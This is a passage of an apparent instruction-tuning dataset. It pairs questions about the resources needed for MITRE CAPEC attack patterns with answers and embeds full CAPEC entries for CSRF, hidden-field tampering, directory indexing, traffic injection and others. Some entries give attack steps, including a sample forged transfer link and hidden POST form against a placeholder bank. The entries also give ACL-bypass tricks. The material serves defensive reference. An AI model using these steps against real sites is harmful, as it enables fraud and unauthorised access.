            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1531",
            "Entry_Name": "Account Access Removal"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Traffic Injection (CAPEC ID: 594)",
    "context": "",
    "output": "The resources required to execute Traffic Injection (CAPEC ID: 594) are the following: A tool, such as a MITM Proxy, that is capable of generating and injecting custom inputs to be used in the attack.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool, such as a MITM Proxy, that is capable of generating and injecting custom inputs to be used in the attack.",
      "@Name": "Traffic Injection (CAPEC ID: 594)",
      "attack_ptrn": {
        "@ID": "594",
        "@Name": "Traffic Injection",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary injects traffic into the target's network connection. The adversary is therefore able to degrade or disrupt the connection, and potentially modify the content. This is not a flooding attack, as the adversary is not focusing on exhausting resources. Instead, the adversary is crafting a specific input to affect the system in a particular way.",
        "Prerequisites": {
          "Prerequisite": [
            "The target application must leverage an open communications channel.",
            "The channel on which the target communicates must be vulnerable to interception (e.g., adversary in the middle attack - CAPEC-94)."
          ]
        },
        "Resources_Required": {
          "Resource": "A tool, such as a MITM Proxy, that is capable of generating and injecting custom inputs to be used in the attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution",
              "Note": "The injection of specific content into a connection can trigger a disruption in that communications channel, thereby denying availability of the service."
            },
            {
              "Scope": "Integrity",
              "Impact": "Other",
              "Note": "An adversary's injection of additional content into a communication channel negatively impacts the integrity of that channel."
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "940"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "Seamus Tuohy",
            "Submission_Date": "2017-01-03"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Prerequisites"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Manipulating Hidden Fields (CAPEC ID: 162)",
    "context": "",
    "output": "The resources required to execute Manipulating Hidden Fields (CAPEC ID: 162) are the following: The adversary must have the ability to modify hidden fields by editing the HTTP response to the server.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must have the ability to modify hidden fields by editing the HTTP response to the server.",
      "@Name": "Manipulating Hidden Fields (CAPEC ID: 162)",
      "attack_ptrn": {
        "@ID": "162",
        "@Name": "Manipulating Hidden Fields",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary exploits a weakness in the server's trust of client-side processing by modifying data on the client-side, such as price information, and then submitting this data to the server, which processes the modified data. For example, eShoplifting is a data manipulation attack against an on-line merchant during a purchasing transaction. The manipulation of price, discount or quantity fields in the transaction message allows the adversary to acquire items at a lower cost than the merchant intended. The adversary performs a normal purchasing transaction but edits hidden fields within the HTML form response that store price or other information to give themselves a better deal. The merchant then uses the modified pricing information in calculating the cost of the selected items.",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "77"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Probe target web application] The adversary first probes the target web application to find all possible pages that can be visited on the website.",
              "Technique": [
                "Use a spidering tool to follow and record all links",
                "Use a proxy tool to record all links visited during a manual traversal of the web application."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Find hidden fields] Once the web application has been traversed, the adversary looks for all hidden HTML fields present in the client-side.",
              "Technique": [
                "Use the inspect tool on all modern browsers and filter for the keyword \"hidden\"",
                "Specifically look for hidden fields inside form elements."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Send modified hidden fields to server-side] Once the adversary has found hidden fields in the client-side, they will modify the values of these hidden fields one by one and then interact with the web application so that this data is sent to the server-side. The adversary observes the response from the server to determine if the values of each hidden field are being validated."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Manipulate hidden fields] Once the adversary has determined which hidden fields are not being validated by the server, they will manipulate them to change the normal behavior of the web application in a way that benefits the adversary.",
              "Technique": "Manipulate a hidden field inside a form element and then submit the form so that the manipulated data is sent to the server."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The targeted site must contain hidden fields to be modified.",
            "The targeted site must not validate the hidden fields with backend processing."
          ]
        },
        "Resources_Required": {
          "Resource": "The adversary must have the ability to modify hidden fields by editing the HTTP response to the server."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "602"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-12-07",
            "#text": "Manipulating hidden fields to change the normal flow of transactions (eShoplifting)"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Cross Site Request Forgery (CAPEC ID: 62), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nAll the attacker needs is the exact representation of requests to be made to the application and to be able to get the malicious link across to a victim.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "All the attacker needs is the exact representation of requests to be made to the application and to be able to get the malicious link across to a victim.",
      "@Name": "Cross Site Request Forgery (CAPEC ID: 62)",
      "attack_ptrn": {
        "@ID": "62",
        "@Name": "Cross Site Request Forgery",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker crafts malicious web links and distributes them (via web pages, email, etc.), typically in a targeted manner, hoping to induce users to click on the link and execute the malicious action against some third-party application. If successful, the action embedded in the malicious link will be processed and accepted by the targeted application with the users' privilege level. This type of attack leverages the persistence and implicit trust placed in user session cookies by many web applications today. In such an architecture, once the user authenticates to an application and a session cookie is created on the user's system, all following transactions for that session are authenticated using that cookie including potential actions initiated by an attacker and simply \"riding\" the existing session cookie.",
        "Alternate_Terms": {
          "Alternate_Term": {
            "Term": "Session Riding"
          }
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "21"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Explore target website] The attacker first explores the target website to determine pieces of functionality that are of interest to them (e.g. money transfers). The attacker will need a legitimate user account on the target website. It would help to have two accounts.",
              "Technique": [
                "Use web application debugging tool such as WebScarab, Tamper Data or TamperIE to analyze the information exchanged between the client and the server",
                "Use network sniffing tool such as Wireshark to analyze the information exchanged between the client and the server",
                "View HTML source of web pages that contain links or buttons that perform actions of interest."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Create a link that when clicked on, will execute the interesting functionality.] The attacker needs to create a link that will execute some interesting functionality such as transfer money, change a password, etc.",
              "Technique": [
                "Create a GET request containing all required parameters (e.g. https://www.somebank.com/members/transfer.asp?to=012345678901&amt=10000)",
                "Create a form that will submit a POST request (e.g. <form method=\"POST\" action=\"https://www.somebank.com/members/transfer.asp\"><input type=\"hidden\" Name=\"to\" value=\"012345678901\"/><input type=\"hidden\" Name=\"amt\" value=\"10000\"/><input type=\"submit\" src=\"clickhere.jpg\"/></form>"
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Convince user to click on link] Finally, the attacker needs to convince a user that is logged into the target website to click on a link to execute the CSRF attack.",
              "Technique": [
                "Execute a phishing attack and send the user an e-mail convincing them to click on a link.",
                "Execute a stored XSS attack on a website to permanently embed the malicious link into the website.",
                "Execute a stored XSS attack on a website where an XMLHTTPRequest object will automatically execute the attack as soon as a user visits the page. This removes the step of convincing a user to click on a link.",
                "Include the malicious link on the attackers' own website where the user may have to click on the link, or where an XMLHTTPRequest object may automatically execute the attack when a user visits the site."
              ]
            }
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker needs to figure out the exact invocation of the targeted malicious action and then craft a link that performs the said action. Having the user click on such a link is often accomplished by sending an email or posting such a link to a bulletin board or the likes."
          }
        },
        "Resources_Required": {
          "Resource": "All the attacker needs is the exact representation of requests to be made to the application and to be able to get the malicious link across to a victim."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Use cryptographic tokens to associate a request with a specific action. The token can be regenerated at every request so that if a request with an invalid token is encountered, it can be reliably discarded. The token is considered invalid if it arrived with a request other than the action it was supposed to be associated with.",
            "Although less reliable, the use of the optional HTTP Referrer header can also be used to determine whether an incoming request was actually one that the user is authorized for, in the current context.",
            "Additionally, the user can also be prompted to confirm an action every time an action concerning potentially sensitive data is invoked. This way, even if the attacker manages to get the user to click on a malicious link and request the desired action, the user has a chance to recover by denying confirmation. This solution is also implicitly tied to using a second factor of authentication before performing such actions.",
            "In general, every request must be checked for the appropriate authentication token as well as authorization in the current session context."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "While a user is logged into their bank account, an attacker can send an email with some potentially interesting content and require the user to click on a link in the email.",
              "The link points to or contains an attacker setup script, probably even within an iFrame, that mimics an actual user form submission to perform a malicious activity, such as transferring funds from the victim's account.",
              "The attacker can have the script embedded in, or targeted by, the link perform any arbitrary action as the authenticated user. When this script is executed, the targeted application authenticates and accepts the actions based on the victims existing session cookie."
            ],
            "#text": "See also: Cross-site request forgery (CSRF) vulnerability in util.pl in @Mail WebMail 4.51 allows remote attackers to modify arbitrary settings and perform unauthorized actions as an arbitrary user, as demonstrated using a settings action in the SRC attribute of an IMG element in an HTML e-mail."
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "352"
            },
            {
              "@CWE_ID": "306"
            },
            {
              "@CWE_ID": "664"
            },
            {
              "@CWE_ID": "732"
            },
            {
              "@CWE_ID": "1275"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "09",
              "Entry_Name": "Cross-Site Request Forgery"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Cross Site Request Forgery (CSRF)"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-62"
            },
            {
              "@External_Reference_ID": "REF-602",
              "@Section": "Testing for Cross Site Request Forgery"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Alternate_Terms, Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-01-09",
            "#text": "Cross Site Request Forgery (aka Session Riding)"
          }
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Directory Indexing (CAPEC ID: 127)",
    "context": "",
    "output": "required resources:\nAbility to send HTTP requests to a web application.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to send HTTP requests to a web application.",
      "@Name": "Directory Indexing (CAPEC ID: 127)",
      "attack_ptrn": {
        "@ID": "127",
        "@Name": "Directory Indexing",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary crafts a request to a target that results in the target listing/indexing the content of a directory as output. One common method of triggering directory contents as output is to construct a request containing a path that terminates in a directory name rather than a file name since many applications are configured to provide a list of the directory's contents when such a request is received. An adversary can use this to explore the directory tree on a target as well as learn the names of files. This can often end up revealing test files, backup files, temporary files, hidden files, configuration files, user accounts, script contents, as well as naming conventions, all of which can be used by an attacker to mount additional attacks.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "54"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Directory Discovery] Use a method, either manual, scripted, or automated to discover the directories on the server by making requests for directories that may possibly exist. During this phase the adversary is less concerned with whether a directory can be accessed or indexed and more focused on simply discovering what directories do exist on the target.",
              "Technique": [
                "Send requests to the web server for common directory names",
                "If directories are discovered that are native to a server type further refine the directory search to include directories usually present on those types of servers.",
                "Search for uncommon or potentially user created directories that may be present."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Iteratively explore directory/file structures] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods",
              "Technique": [
                "Use a scanner tool to dynamically add directories/files to include their scan based upon data obtained in initial probes.",
                "Use a browser to manually explore the website by issuing a request ending the URL in a slash '/'.",
                "Attempt to bypass ACLs on directories by using methods that known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.",
                "Sequentially request a list of common base files to each directory discovered.",
                "Try multiple fuzzing techniques to list directory contents for directories that will not reveal their contents with a \"/\" request"
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Read directories or files which are not intended for public viewing.] The adversary attempts to access the discovered directories that allow access and may attempt to bypass server or application level ACLs by using manual or automated methods",
              "Technique": [
                "Try multiple exploit techniques to list directory contents for directories that will not reveal their contents with a \"/\" request",
                "Try other known exploits to elevate privileges sufficient to bypass protected directories.",
                "List the files in the directory by issuing a request with the URL ending in a \"/\" slash.",
                "Access the files via direct URL and capture contents.",
                "Attempt to bypass ACLs on directories by using methods that are known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.",
                "Sequentially request a list of common base files to each directory discovered."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target must be misconfigured to return a list of a directory's content when it receives a request that ends in a directory name rather than a file name.",
            "The adversary must be able to control the path that is requested of the target.",
            "The administrator must have failed to properly configure an ACL or has associated an overly permissive ACL with a particular directory.",
            "The server version or patch level must not inherently prevent known directory listing attacks from working."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To issue the request to URL without given a specific file name"
            },
            {
              "@Level": "High",
              "#text": "To bypass the access control of the directory of listings"
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Ability to send HTTP requests to a web application."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data",
            "Note": "Information Leakage"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "1. Using blank index.html: putting blank index.html simply prevent directory listings from displaying to site visitors.",
            "2. Preventing with .htaccess in Apache web server: In .htaccess, write \"Options-indexes\".",
            "3. Suppressing error messages: using error 403 \"Forbidden\" message exactly like error 404 \"Not Found\" message."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "The adversary uses directory listing to view sensitive files in the application. This is an example of accessing the backup file. The attack issues a request for http://www.example.com/admin/ and receives the following dynamic directory indexing content in the response: Index of /admin Name Last Modified Size Description backup/ 31-May-2007 08:18 - Apache/ 2.0.55 Server at www.example.com Port 80",
              "The target application does not have direct hyperlink to the \"backup\" directory in the normal html webpage, however the attacker has learned of this directory due to indexing the content. The client then requests the backup directory URL and receives output which has a \"db_dump.php\" file in it. This sensitive data should not be disclosed publicly."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "424"
            },
            {
              "@CWE_ID": "425"
            },
            {
              "@CWE_ID": "288"
            },
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "732"
            },
            {
              "@CWE_ID": "276"
            },
            {
              "@CWE_ID": "693"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1083",
            "Entry_Name": "File and Directory Discovery"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-11",
            "@Section": "WASC-16 - Directory Indexing"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated References, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Examples-Instances, Related_Vulnerabilities"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Reverse Engineer an Executable to Expose Assumed Hidden Functionality (CAPEC ID: 190)",
    "context": "",
    "output": "required resources:\nAccess to the target file such that it can be analyzed with the appropriate tools. A range of tools suitable for analyzing an executable or its operations",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Access to the target file such that it can be analyzed with the appropriate tools. A range of tools suitable for analyzing an executable or its operations",
      "@Name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality (CAPEC ID: 190)",
      "attack_ptrn": {
        "@ID": "190",
        "@Name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker analyzes a binary file or executable for the purpose of discovering the structure, function, and possibly source-code of the file by using a variety of analysis techniques to effectively determine how the software functions and operates. This type of analysis is also referred to as Reverse Code Engineering, as techniques exist for extracting source code from an executable. Several techniques are often employed for this purpose, both black box and white box. The use of computer bus analyzers and packet sniffers allows the binary to be studied at a level of interactions with its computing environment, such as a host OS, inter-process communication, and/or network communication. This type of analysis falls into the 'black box' category because it involves behavioral analysis of the software without reference to source code, object code, or protocol specifications.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "167",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Resources_Required": {
          "Resource": "Access to the target file such that it can be analyzed with the appropriate tools. A range of tools suitable for analyzing an executable or its operations"
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "912"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-51",
              "@Section": "Decompiler"
            },
            {
              "@External_Reference_ID": "REF-52",
              "@Section": "Debugger"
            },
            {
              "@External_Reference_ID": "REF-53",
              "@Section": "Disassembler"
            }
          ]
        },
        "Notes": {
          "Note": {
            "@Type": "Other",
            "xhtml:p": [
              "White box analysis techniques include file or binary analysis, debugging, disassembly, and decompilation, and generally fall into categories referred to as 'static' and 'dynamic' analysis. Static analysis encompasses methods which analyze the binary, or extract its source code or object code without executing the program. Dynamic analysis involves analyzing the program during execution.",
              "Some forms of file analysis tools allow the executable itself to be analyzed, the most basic of which can analyze features of the binary. More sophisticated forms of static analysis analyze the binary file and extract assembly code, and possibly source code representations, from analyzing the structure of the file itself. Dynamic analysis tools execute the binary file and monitor its in memory footprint, revealing its execution flow, memory usage, register values, and machine instructions. This type of analysis is most effective for analyzing the execution of binary files whose content has been obfuscated or encrypted in its native executable form.",
              "Debuggers allow the program's execution to be monitored, and depending upon the debugger's sophistication may show relevant source code for each step in execution, or may display and allow interactions with memory, variables, or values generated by the program during run-time operations. Disassemblers operate in reverse of assemblers, allowing assembly code to be extracted from a program as it executes machine code instructions. Disassemblers allow low-level interactions with the program as it executes, such as manipulating the program's run time operations. Decompilers can be utilized to analyze a binary file and extract source code from the compiled executable. Collectively, the tools and methods described are those commonly applied to a binary executable file and provide means for reverse engineering the file by revealing the hidden functions of its operation or composition."
            ]
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Description Summary, Other_Notes, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated @Name, Notes, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2019-04-04",
            "#text": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality or Content"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Excavation (CAPEC ID: 116), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nA tool, such as an Adversary in the Middle (CAPEC-94) Proxy or a fuzzer, that is capable of generating and injecting custom inputs to be used in the attack.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A tool, such as an Adversary in the Middle (CAPEC-94) Proxy or a fuzzer, that is capable of generating and injecting custom inputs to be used in the attack.",
      "@Name": "Excavation (CAPEC ID: 116)",
      "attack_ptrn": {
        "@ID": "116",
        "@Name": "Excavation",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": "An adversary actively probes the target in a manner that is designed to solicit information that could be leveraged for malicious purposes.",
        "Extended_Description": {
          "xhtml:p": "This is achieved by exploring the target via ordinary interactions for the purpose of gathering intelligence about the target, or by sending data that is syntactically invalid or non-standard in an attempt to produce a response that contains the desired data. As a result of these interactions, the adversary is able to obtain information from the target that aids the attacker in making inferences about its security, configuration, or potential vulnerabilities. Examplar exchanges with the target may trigger unhandled exceptions or verbose error messages that reveal information like stack traces, configuration information, path information, or database design. This type of attack also includes the manipulation of query strings in a URI to produce invalid SQL queries, or by trying alternative path values in the hope that the server will return useful information."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "CanPrecede",
            "@CAPEC_ID": "163"
          }
        },
        "Prerequisites": {
          "Prerequisite": "An adversary requires some way of interacting with the system."
        },
        "Resources_Required": {
          "Resource": "A tool, such as an Adversary in the Middle (CAPEC-94) Proxy or a fuzzer, that is capable of generating and injecting custom inputs to be used in the attack."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Minimize error/response output to only what is necessary for functional use or corrective language.",
            "Remove potentially sensitive information that is not necessary for the application's functionality."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "200"
            },
            {
              "@CWE_ID": "1243"
            }
          ]
        },
        "Notes": {
          "Note": [
            {
              "@Type": "Other",
              "#text": "Large quantities of data is often moved from the target system to some other adversary controlled system. Data found on a target system might require extensive resources to be fully analyzed. Using these resources on the target system might enable a defender to detect the adversary. Additionally, proper analysis tools required might not be available on the target system."
            },
            {
              "@Type": "Other",
              "#text": "This attack differs from Data Interception and other data collection attacks in that the attacker actively queries the target rather than simply watching for the target to reveal information."
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Activation_Zone, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Other_Notes, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: ICMP Information Request (CAPEC ID: 296)",
    "context": "",
    "output": "The resources required to execute ICMP Information Request (CAPEC ID: 296) are the following: Scanners or utilities that provide the ability to send custom ICMP queries.",
